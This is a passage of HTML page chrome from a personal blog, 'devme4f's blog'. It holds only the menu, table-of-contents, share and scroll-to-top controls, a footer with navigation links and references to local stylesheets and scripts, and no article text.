          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>


  <footer id="footer">
  <div class="footer-left">
    Copyright  &copy; 2024  devme4f&#39;s blog 
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/posts">Archives</a></li>
         
        <li><a href="/about">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>


  </div>
</body>

<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
<script src=/lib/jquery/jquery.min.js></script>
<script src=/js/main.js></script>

<script src=/js/code-copy.js></script>




</html>
